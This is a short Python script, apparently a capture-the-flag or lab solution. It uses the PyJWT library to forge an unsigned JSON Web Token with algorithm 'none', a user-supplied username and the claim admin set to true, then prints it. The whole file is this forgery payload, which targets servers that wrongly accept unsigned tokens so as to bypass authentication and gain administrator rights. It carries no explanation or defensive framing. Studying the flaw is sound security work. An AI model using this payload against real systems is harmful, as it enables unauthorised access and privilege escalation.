import jwt
a=input("Enter your name:")
encoded_jwt = jwt.encode({'username': a, 'admin': True}, None, algorithm="none")
print(encoded_jwt)